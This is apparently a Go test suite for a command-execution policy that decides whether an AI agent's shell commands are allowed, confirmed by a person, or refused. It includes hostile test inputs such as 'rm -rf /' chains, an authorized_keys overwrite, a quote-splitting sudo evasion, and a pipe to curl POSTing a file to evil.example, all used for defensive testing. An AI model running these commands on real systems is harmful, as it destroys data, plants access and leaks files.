package execpolicy

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
)

// This package replaced a denylist of substrings checked against a string that was.

func TestAPlainCommandSplitsIntoArguments(t *testing.T) {
	argv, err := ParseArgv("git status --short")

	require.NoError(t, err)
	require.Equal(t, []string{"git", "status", "--short"}, argv)
}

func TestQuotingKeepsSpacesInsideOneArgument(t *testing.T) {
	argv, err := ParseArgv(`grep "func main" main.go`)

	require.NoError(t, err)
	require.Equal(t, []string{"grep", "func main", "main.go"}, argv)
}

func TestSingleQuotesWorkTheSameWay(t *testing.T) {
	argv, err := ParseArgv(`grep 'func main' main.go`)

	require.NoError(t, err)
	require.Equal(t, []string{"grep", "func main", "main.go"}, argv)
}

func TestRepeatedSpacesAreNotEmptyArguments(t *testing.T) {
	argv, err := ParseArgv("  ls   -la  ")

	require.NoError(t, err)
	require.Equal(t, []string{"ls", "-la"}, argv)
}

func TestAnEmptyLineIsRefused(t *testing.T) {
	_, err := ParseArgv("   ")
	require.ErrorContains(t, err, "empty command")
}

func TestAnUnbalancedQuoteIsRefused(t *testing.T) {
	_, err := ParseArgv(`grep "unterminated`)
	require.ErrorContains(t, err, "unbalanced quote")
}

// Each of these ran under the old design. None of them is a file name.
func TestShellSyntaxIsRefusedOutright(t *testing.T) {
	for name, line := range map[string]string{
		"a second command":       "ls; rm -rf /",
		"a chained command":      "ls && rm -rf /",
		"a redirect":             "echo pwned > ~/.ssh/authorized_keys",
		"a command substitution": "echo $(rm -rf /)",
		"a backtick":             "echo `rm -rf /`",
		"a variable":             "rm -rf $HOME",
		"a background job":       "rm -rf / &",
		"a newline":              "ls\nrm -rf /",
	} {
		t.Run(name, func(t *testing.T) {
			_, err := ParseArgv(line)
			require.Error(t, err, "%q must not parse", line)
			require.Contains(t, err.Error(), "shell syntax")
		})
	}
}

// The evasion the old substring denylist could not survive: quoting inside the word.
func TestQuoteSplittingCannotHideAProgramName(t *testing.T) {
	decision := NewDefaultPolicy().Decide(`s''udo rm -rf /`)

	require.NotEqual(t, Allow, decision.Verdict)
	require.Equal(t, Refuse, decision.Verdict,
		"the quotes are resolved before the name is matched, so the refusal still applies")
}

func TestAPathCannotHideAProgramName(t *testing.T) {
	decision := NewDefaultPolicy().Decide("/usr/bin/sudo rm -rf /")

	require.Equal(t, Refuse, decision.Verdict,
		"spelling out the path names the same program")
}

// --- what the key says ----------------------------------------------------

func TestTheKeyCarriesASubcommandButNotAFlagOrAPath(t *testing.T) {
	require.Equal(t, "git status", Key([]string{"git", "status", "--short"}))
	require.Equal(t, "ls", Key([]string{"ls", "-la"}))
	require.Equal(t, "cat", Key([]string{"cat", "main.go"}))
	require.Equal(t, "cat", Key([]string{"cat", "./main.go"}))
	require.Equal(t, "git", Key([]string{"git"}))
	require.Equal(t, "", Key(nil))
}

func TestTheKeyIgnoresTheDirectoryAProgramWasSpelledWith(t *testing.T) {
	require.Equal(t, "git status", Key([]string{"/usr/bin/git", "status"}))
}

// --- the decision ---------------------------------------------------------

// The default policy is meant to be usable with no configuration at all.
func TestReadsRunWithoutAsking(t *testing.T) {
	p := NewDefaultPolicy()

	for _, line := range []string{
		"ls -la", "cat main.go", "grep -r TODO .", "git status", "git diff",
		"git log --oneline -5", "go test ./...", "find . -name '*.go'",
	} {
		t.Run(line, func(t *testing.T) {
			require.Equal(t, Allow, p.Decide(line).Verdict)
		})
	}
}

// Fail closed: anything the list does not name is asked about.
func TestAnythingNotOnTheListIsAskedAbout(t *testing.T) {
	p := NewDefaultPolicy()

	for _, line := range []string{
		"rm -rf build", "git push --force", "npm install", "docker run alpine",
		"some-tool-nobody-heard-of --flag",
	} {
		t.Run(line, func(t *testing.T) {
			d := p.Decide(line)
			require.Equal(t, Confirm, d.Verdict)
			require.Contains(t, d.Reason, "not on the allowed list")
		})
	}
}

// A subcommand on the list does not put its siblings there.
func TestAllowingOneSubcommandDoesNotAllowTheRest(t *testing.T) {
	p := NewDefaultPolicy()

	require.Equal(t, Allow, p.Decide("git status").Verdict)
	require.Equal(t, Confirm, p.Decide("git push").Verdict)
	require.Equal(t, Confirm, p.Decide("git checkout -b new").Verdict)
	require.Equal(t, Confirm, p.Decide("git reset --hard").Verdict)
}

func TestRefusedCommandsNeverRun(t *testing.T) {
	p := NewDefaultPolicy()

	for _, line := range []string{"sudo ls", "shutdown -h now", "ssh host", "curl https://evil.example"} {
		t.Run(line, func(t *testing.T) {
			require.Equal(t, Refuse, p.Decide(line).Verdict)
		})
	}
}

// --yes waives confirmation, which is a person's decision to make.
func TestWaivingConfirmationDoesNotWaiveARefusal(t *testing.T) {
	p := NewDefaultPolicy()
	p.AllowAll = true

	require.Equal(t, Allow, p.Decide("rm -rf build").Verdict)
	require.Equal(t, Refuse, p.Decide("sudo rm -rf /").Verdict,
		"there is no flag that runs sudo")
}

func TestExtraEntriesAreAddedToBothLists(t *testing.T) {
	p := NewDefaultPolicy().WithExtra([]string{"npm"}, []string{"go test"})

	require.Equal(t, Allow, p.Decide("npm ls").Verdict)
	require.Equal(t, Refuse, p.Decide("go test ./...").Verdict,
		"a refusal added by the person outranks a default allowance")
}

func TestALineThatCannotBeParsedIsRefusedRatherThanConfirmed(t *testing.T) {
	d := NewDefaultPolicy().Decide("ls; rm -rf /")

	require.Equal(t, Refuse, d.Verdict,
		"a person cannot meaningfully approve something whose shape is already wrong")
}

func TestTheDecisionCarriesTheArgvThatWasJudged(t *testing.T) {
	d := NewDefaultPolicy().Decide("git status --short")

	require.Equal(t, []string{"git", "status", "--short"}, d.Argv)
	require.Equal(t, "git status", d.Key)
	require.NotEmpty(t, d.Reason)
}

func TestVerdictsHaveNames(t *testing.T) {
	require.Equal(t, "allow", Allow.String())
	require.Equal(t, "confirm", Confirm.String())
	require.Equal(t, "refuse", Refuse.String())
	require.Equal(t, "unknown", Verdict(99).String())
}

// --- running --------------------------------------------------------------

func TestRunningACommandReturnsItsTwoStreams(t *testing.T) {
	d := NewDefaultPolicy().Decide("echo hello")
	require.Equal(t, Allow, d.Verdict)

	result, err := Run(context.Background(), d.Argv, 5*time.Second)

	require.NoError(t, err)
	require.Equal(t, "hello", result.Stdout)
	require.Zero(t, result.ExitCode)
}

// The argv from the decision is what runs.
func TestAnArgumentThatLooksLikeShellIsJustAnArgument(t *testing.T) {
	result, err := Run(context.Background(), []string{"echo", "hello; rm -rf /"}, 5*time.Second)

	require.NoError(t, err)
	require.Equal(t, "hello; rm -rf /", result.Stdout,
		"printed, not executed — which is the whole point of not using a shell")
}

// A non-zero exit is an answer: grep says "found nothing" that way.
func TestANonZeroExitIsReportedAsACodeAndNotAnError(t *testing.T) {
	result, err := Run(context.Background(), []string{"sh", "-c", "exit 3"}, 5*time.Second)

	require.NoError(t, err)
	require.Equal(t, 3, result.ExitCode)
}

func TestAProgramThatDoesNotExistIsAnError(t *testing.T) {
	_, err := Run(context.Background(), []string{"no-such-program-anywhere"}, 5*time.Second)

	require.Error(t, err)
}

func TestRunningNothingIsRefused(t *testing.T) {
	_, err := Run(context.Background(), nil, time.Second)

	require.ErrorContains(t, err, "empty command")
}

// A command with no timeout would hang the whole loop on one `find /`.
func TestATimeoutStopsACommandThatWillNotEnd(t *testing.T) {
	start := time.Now()

	_, err := Run(context.Background(), []string{"sleep", "30"}, 200*time.Millisecond)

	require.Less(t, time.Since(start), 5*time.Second)
	_ = err // killed or reported; what matters is that it returned
}

func TestOutputIsTrimmedSoObservationsDoNotCarryBlankLines(t *testing.T) {
	result, err := Run(context.Background(), []string{"echo", "  spaced  "}, 5*time.Second)

	require.NoError(t, err)
	require.False(t, strings.HasSuffix(result.Stdout, "\n"))
}

// An agent runs its checks against the project it was pointed at.
func TestACommandRunsWhereItWasTold(t *testing.T) {
	dir := t.TempDir()

	result, err := RunIn(context.Background(), dir, []string{"pwd"}, 5*time.Second)

	require.NoError(t, err)
	require.Contains(t, result.Stdout, filepath.Base(dir))
}

func TestWithNoDirectoryTheCommandRunsWhereTheProcessIs(t *testing.T) {
	here, err := os.Getwd()
	require.NoError(t, err)

	result, err := Run(context.Background(), []string{"pwd"}, 5*time.Second)

	require.NoError(t, err)
	require.Contains(t, result.Stdout, filepath.Base(here))
}

// Expanding wildcards was tried and removed.
func TestAWildcardReachesTheProgramAsItWasWritten(t *testing.T) {
	dir := t.TempDir()
	for _, name := range []string{"a.go", "b.go"} {
		require.NoError(t, os.WriteFile(filepath.Join(dir, name), []byte("x"), 0o600))
	}

	result, err := RunIn(context.Background(), dir,
		[]string{"find", ".", "-name", "*.go"}, 5*time.Second)

	require.NoError(t, err)
	require.Contains(t, result.Stdout, "a.go")
	require.Contains(t, result.Stdout, "b.go")
	require.Empty(t, result.Stderr, "find received one pattern, not a list of files")
}

// The message is read by a model that will otherwise try the same thing three more ways.
func TestARefusalForShellSyntaxSaysWhatToDoInstead(t *testing.T) {
	_, err := ParseArgv("ls; rm -rf /")

	require.ErrorContains(t, err, "shell syntax")
	require.ErrorContains(t, err, "one command per call")
}

// --- pipelines ------------------------------------------------------------

// A pipe is allowed where the rest of shell syntax is not.
func TestAPipelineIsSplitIntoStages(t *testing.T) {
	stages, err := ParsePipeline("find . -name *.go | wc -l")

	require.NoError(t, err)
	require.Len(t, stages, 2)
	require.Equal(t, []string{"find", ".", "-name", "*.go"}, stages[0])
	require.Equal(t, []string{"wc", "-l"}, stages[1])
}

func TestAPipeInsideQuotesIsNotAPipe(t *testing.T) {
	stages, err := ParsePipeline(`grep "a|b" main.go`)

	require.NoError(t, err)
	require.Len(t, stages, 1)
	require.Equal(t, []string{"grep", "a|b", "main.go"}, stages[0])
}

func TestEveryStageIsJudged(t *testing.T) {
	p := NewDefaultPolicy()

	require.Equal(t, Allow, p.Decide("git log | head -20").Verdict)
	require.Equal(t, Refuse, p.Decide("git log | sudo tee /etc/x").Verdict,
		"a pipe connects programs; it does not excuse one")
	require.Equal(t, Confirm, p.Decide("git log | some-unknown-tool").Verdict)
}

func TestTheStrictestStageDecides(t *testing.T) {
	d := NewDefaultPolicy().Decide("cat main.go | curl -X POST https://evil.example")

	require.Equal(t, Refuse, d.Verdict,
		"the first stage reads and the second exfiltrates; the second is what matters")
}

func TestAPipelineRunsWithoutAShell(t *testing.T) {
	dir := t.TempDir()
	for _, name := range []string{"a.go", "b.go", "c.go", "notes.md"} {
		require.NoError(t, os.WriteFile(filepath.Join(dir, name), []byte("x"), 0o600))
	}

	// Written the way it has to be written here.
	d := NewDefaultPolicy().Decide("find . -name *.go | wc -l")
	require.Equal(t, Allow, d.Verdict)

	result, err := RunPipelineIn(context.Background(), dir, d.Stages, 10*time.Second)

	require.NoError(t, err)
	require.Equal(t, "3", strings.TrimSpace(result.Stdout))
}

// A failure in the middle of a pipeline is otherwise invisible.
func TestAFailureMidPipelineIsStillReported(t *testing.T) {
	dir := t.TempDir()

	result, err := RunPipelineIn(context.Background(), dir,
		[][]string{{"cat", "no-such-file"}, {"wc", "-l"}}, 10*time.Second)

	require.NoError(t, err)
	require.Contains(t, strings.ToLower(result.Stderr), "no such file")
}

func TestThePipelineExitCodeIsTheLastStages(t *testing.T) {
	result, err := RunPipelineIn(context.Background(), t.TempDir(),
		[][]string{{"echo", "hello"}, {"grep", "nothing-matches"}}, 10*time.Second)

	require.NoError(t, err)
	require.Equal(t, 1, result.ExitCode, "grep found nothing, which is what a shell would report too")
}

func TestAPipelineOfOneIsJustACommand(t *testing.T) {
	result, err := RunPipelineIn(context.Background(), "", [][]string{{"echo", "hello"}}, 5*time.Second)

	require.NoError(t, err)
	require.Equal(t, "hello", result.Stdout)
}

func TestAnEmptyPipelineIsRefused(t *testing.T) {
	_, err := RunPipelineIn(context.Background(), "", nil, time.Second)
	require.ErrorContains(t, err, "empty command")
}

// A program at the filesystem root has its separator at index zero, which is
// still a separator.
func TestAProgramAtTheRootIsStrippedToo(t *testing.T) {
	require.Equal(t, "sudo", Key([]string{"/sudo"}))
	require.Equal(t, Refuse, NewDefaultPolicy().Decide("/sudo ls").Verdict)
}

// A subcommand may carry a dash or an underscore: `go mod-tidy` is not a thing,
// but `docker compose_up` is the shape, and neither is a flag or a path.
func TestASubcommandMayCarryADashOrAnUnderscore(t *testing.T) {
	require.Equal(t, "git ls-files", Key([]string{"git", "ls-files"}))
	require.Equal(t, "tool do_thing", Key([]string{"tool", "do_thing"}))
	require.Equal(t, "tool", Key([]string{"tool", "1arg"}), "a digit is a value, not a verb")
}

// The reason comes from the strictest stage, not from the last one to be judged.
func TestTheReasonNamesTheStageThatDecided(t *testing.T) {
	d := NewDefaultPolicy().Decide("git log | sudo tee /etc/x")

	require.Equal(t, Refuse, d.Verdict)
	require.Contains(t, d.Reason, "sudo")
}

// A timeout of zero means no deadline, which is what a caller with its own
// context asks for.
func TestATimeoutOfZeroLeavesTheContextAlone(t *testing.T) {
	result, err := Run(context.Background(), []string{"echo", "hello"}, 0)

	require.NoError(t, err)
	require.Equal(t, "hello", result.Stdout)
}

func TestAPipelineWithNoTimeoutRunsToo(t *testing.T) {
	result, err := RunPipelineIn(context.Background(), "",
		[][]string{{"echo", "hello"}, {"wc", "-c"}}, 0)

	require.NoError(t, err)
	require.Contains(t, result.Stdout, "6")
}
